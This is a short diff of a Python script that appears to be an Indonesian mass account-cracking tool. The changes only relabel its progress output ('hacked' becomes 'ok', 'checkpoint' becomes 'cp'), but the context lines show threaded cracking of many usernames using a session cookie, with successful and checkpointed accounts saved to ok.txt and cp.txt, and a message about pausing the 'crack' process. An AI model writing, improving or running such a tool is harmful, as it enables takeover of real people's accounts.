@@ -140,7 +140,7 @@ def moch_yayan():
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -315,7 +315,7 @@ def moch_yayan():
                    print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] hasil\x1b[1;92m OK\x1b[1;97m di simpan ke : ok.txt\n [\x1b[1;93m-\x1b[1;97m] hasil\x1b[1;93m CP\x1b[1;97m di simpan ke : cp.txt')
-                   print('\n [\x1b[1;91m!\x1b[1;97m] matikan mode data untuk menjeda proses crack')
+                   print('\n [\x1b[1;91m!\x1b[1;97m] matikan mode data untuk menjeda proses crack\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
